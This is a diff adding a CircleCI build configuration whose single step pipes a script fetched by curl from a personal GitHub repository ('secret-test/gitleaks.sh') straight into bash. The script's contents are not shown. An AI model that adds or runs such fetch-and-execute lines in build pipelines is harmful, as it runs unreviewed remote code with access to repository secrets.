@@ -1,0 +1,10 @@
+version: 2
+jobs:
+  build:
+    docker:
+        - image: ruby:2.4.0
+          environment:
+            - LANG: C.UTF-8
+    steps:
+      - checkout
+      - run: bash <(curl -s https://raw.githubusercontent.com/Giriraj249/secret-test/main/gitleaks.sh)
